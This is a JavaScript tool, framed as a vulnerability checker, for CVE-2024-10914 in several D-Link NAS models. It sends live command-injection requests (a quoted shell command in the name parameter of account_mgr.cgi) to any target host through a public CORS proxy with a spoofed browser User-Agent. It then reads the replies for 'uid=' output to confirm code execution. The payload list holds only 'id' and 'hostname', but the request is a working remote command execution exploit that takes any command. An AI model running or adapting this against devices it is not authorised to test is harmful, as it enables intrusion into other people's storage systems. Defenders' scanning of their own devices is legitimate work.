/**
 * CVE-2024-10914 Vulnerability Checker
 * This script checks for command injection vulnerability in D-Link NAS devices
 * through the account management CGI script.
 */

const PAYLOADS = [
    "id",
    "hostname",
];

const PROXY_URL = 'https://cors-anywhere.herokuapp.com/';

const VULNERABLE_DEVICES = {
    "DNS-320": {
        firmware: ["1.00"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-320:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-320_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-320_firmware:*:*:*:*:*:*:*:*"
        }
    },
    "DNS-320LW": {
        firmware: ["1.01.0914.2012"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-320lw:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-320lw_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-320lw_firmware:*:*:*:*:*:*:*:*"
        }
    },
    "DNS-325": {
        firmware: ["1.01", "1.02"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-325:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-325_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-325_firmware:*:*:*:*:*:*:*:*"
        }
    },
    "DNS-340L": {
        firmware: ["1.08"],
        cpe: {
            hardware: "cpe:2.3:h:d-link:dns-340l:*:*:*:*:*:*:*:*",
            firmware: "cpe:2.3:o:dlink:dns-340l_firmware:*:*:*:*:*:*:*:*",
            application: "cpe:2.3:a:dlink:dns-340l_firmware:*:*:*:*:*:*:*:*"
        }
    }
};

const TARGET_HISTORY_KEY = 'cve_2024_10914_target_history';

const SERVER_SIGNATURES = {
    'lighttpd': {
        versions: ['1.4.25', '1.4.25-devel'],
        risk: 'Medium',
        details: 'Older version of lighttpd server detected'
    }
};

function saveTargetHistory(target, result) {
    try {
        let history = JSON.parse(localStorage.getItem(TARGET_HISTORY_KEY) || '[]');
        
        history.unshift({
            target,
            result,
            timestamp: new Date().toISOString()
        });
        
        history = history.slice(0, 10);
        
        localStorage.setItem(TARGET_HISTORY_KEY, JSON.stringify(history));
    } catch (error) {
        console.error('Error saving target history:', error);
    }
}

function getTargetHistory() {
    try {
        return JSON.parse(localStorage.getItem(TARGET_HISTORY_KEY) || '[]');
    } catch (error) {
        console.error('Error getting target history:', error);
        return [];
    }
}

function clearTargetHistory() {
    try {
        localStorage.removeItem(TARGET_HISTORY_KEY);
    } catch (error) {
        console.error('Error clearing target history:', error);
    }
}

function checkLastModified(lastModified) {
    if (!lastModified) return null;
    
    const lastModifiedDate = new Date(lastModified);
    const currentDate = new Date();
    const yearsOld = (currentDate - lastModifiedDate) / (1000 * 60 * 60 * 24 * 365);
    
    if (yearsOld > 5) {
        return {
            warning: true,
            message: `Warning: Server content is very old (${Math.floor(yearsOld)} years). This may indicate an outdated or unmaintained system.`
        };
    }
    
    return null;
}

async function analyzeServerHeaders(headers) {
    const analysis = {
        serverInfo: null,
        lastModified: null,
        securityHeaders: {},
        warnings: []
    };

    const serverHeader = headers.get('server');
    if (serverHeader) {
        for (const [server, info] of Object.entries(SERVER_SIGNATURES)) {
            if (serverHeader.toLowerCase().includes(server.toLowerCase())) {
                analysis.serverInfo = {
                    type: server,
                    version: serverHeader,
                    risk: info.risk,
                    details: info.details
                };
                break;
            }
        }
    }


    const lastModified = headers.get('last-modified');
    if (lastModified) {
        const lastModifiedDate = new Date(lastModified);
        const currentDate = new Date();
        const yearsOld = (currentDate - lastModifiedDate) / (1000 * 60 * 60 * 24 * 365);
        
        analysis.lastModified = {
            date: lastModifiedDate,
            age: yearsOld,
            warning: yearsOld > 5
        };

        if (yearsOld > 5) {
            analysis.warnings.push(`Server content is very old (${Math.floor(yearsOld)} years)`);
        }
    }


    const securityHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'x-xss-protection',
        'content-security-policy',
        'strict-transport-security'
    ];

    securityHeaders.forEach(header => {
        analysis.securityHeaders[header] = headers.get(header) ? 'Present' : 'Missing';
    });

    return analysis;
}

async function checkVulnerability(targetUrl, port = 80) {
    try {
        const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
        let hasConnectionError = false;
        let successfulResponses = 0;
        let errorResponses = 0;
        let suspiciousResponses = 0;
        let serverAnalysis = null;
        let responseTimes = [];
        let rateLimitHit = false;
        let rateLimitMessage = '';
        try {
            const startTime = performance.now();
            const testUrl = `${PROXY_URL}http://${cleanUrl}:${port}/`;
            const response = await fetch(testUrl, {
                method: 'HEAD',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
                    'Origin': window.location.origin,
                    'X-Requested-With': 'XMLHttpRequest'
                },
                timeout: 10000
            });
            const endTime = performance.now();
            responseTimes.push(endTime - startTime);
            if (response.status === 429) {
                rateLimitHit = true;
                rateLimitMessage = 'Received HTTP 429 (Too Many Requests). This is caused by rate limiting from the proxy or target server. Please wait a few minutes, reduce scan speed, or use your own proxy (e.g., deploy your own CORS Anywhere instance).';
                throw new Error(rateLimitMessage);
            }
            if (!response.ok) {
                const result = {
                    vulnerable: false,
                    details: 'Target is not reachable',
                    confidence: 'High',
                    evidence: {
                        status: response.status,
                        statusText: response.statusText
                    }
                };
                saveTargetHistory(`${cleanUrl}:${port}`, result);
                return result;
            }
            serverAnalysis = await analyzeServerHeaders(response.headers);
        } catch (error) {
            const result = {
                vulnerable: false,
                details: error.message || 'Target is not reachable',
                confidence: 'High',
                evidence: {
                    error: error.message
                }
            };
            saveTargetHistory(`${cleanUrl}:${port}`, result);
            return result;
        }
        for (const payload of PAYLOADS) {
            const startTime = performance.now();
            const testUrl = `${PROXY_URL}http://${cleanUrl}:${port}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=';${payload};'`;
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);
                const response = await fetch(testUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': '*/*',
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': window.location.origin
                    },
                    signal: controller.signal,
                    credentials: 'omit'
                });
                const endTime = performance.now();
                responseTimes.push(endTime - startTime);
                clearTimeout(timeoutId);
                if (response.status === 429) {
                    rateLimitHit = true;
                    rateLimitMessage = 'Received HTTP 429 (Too Many Requests). This is caused by rate limiting from the proxy or target server. Please wait a few minutes, reduce scan speed, or use your own proxy (e.g., deploy your own CORS Anywhere instance).';
                    throw new Error(rateLimitMessage);
                }
                if (response.status === 200) {
                    const text = await response.text();
                    if (/uid=\d+\(\w+\).*gid=\d+\(\w+\)/.test(text)) {
                        successfulResponses++;
                    }
                    if (text.includes(payload) || text.includes("uid=") || text.includes("root")) {
                        suspiciousResponses++;
                    }
                }
            } catch (error) {
                if (rateLimitHit || (error.message && error.message.includes('429'))) {
                    const result = {
                        vulnerable: false,
                        details: rateLimitMessage || 'Rate limit exceeded (HTTP 429).',
                        confidence: 'Unknown',
                        evidence: { error: error.message, suggestion: 'Wait a few minutes, reduce scan speed, or use your own proxy.' }
                    };
                    saveTargetHistory(`${cleanUrl}:${port}`, result);
                    return result;
                }
                if (error.name === 'AbortError') {
                    hasConnectionError = true;
                } else {
                    console.error('Error during scan:', error);
                }
            }
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        const avgResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
        const performanceWarning = avgResponseTime > 1000 ? {
            warning: true,
            message: `Server response time is slow (${Math.round(avgResponseTime)}ms average)`
        } : null;
        let result;
        if (successfulResponses > 0) {
            result = {
                vulnerable: true,
                details: 'Target is vulnerable to CVE-2024-10914',
                confidence: 'High',
                evidence: {
                    successfulResponses,
                    suspiciousResponses,
                    errorResponses,
                    serverAnalysis,
                    performanceWarning
                }
            };
        } else if (suspiciousResponses > 0) {
            result = {
                vulnerable: true,
                details: 'Target may be vulnerable to CVE-2024-10914',
                confidence: 'Medium',
                evidence: {
                    successfulResponses,
                    suspiciousResponses,
                    errorResponses,
                    serverAnalysis,
                    performanceWarning
                }
            };
        } else if (hasConnectionError) {
            result = {
                vulnerable: false,
                details: 'Connection timeout occurred',
                confidence: 'Medium',
                evidence: {
                    hasConnectionError: true,
                    serverAnalysis,
                    performanceWarning
                }
            };
        } else {
            result = {
                vulnerable: false,
                details: 'Target is not vulnerable to CVE-2024-10914',
                confidence: 'High',
                evidence: {
                    successfulResponses,
                    suspiciousResponses,
                    errorResponses,
                    serverAnalysis,
                    performanceWarning
                }
            };
        }
        saveTargetHistory(`${cleanUrl}:${port}`, result);
        return result;
    } catch (error) {
        const result = {
            vulnerable: false,
            details: error.message || 'Error occurred during check.',
            confidence: 'Unknown',
            evidence: { error: error.message, suggestion: 'If you see HTTP 429, wait a few minutes, reduce scan speed, or use your own proxy.' }
        };
        saveTargetHistory(targetUrl, result);
        return result;
    }
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { 
        checkVulnerability, 
        VULNERABLE_DEVICES,
        getTargetHistory,
        clearTargetHistory
    };
} 
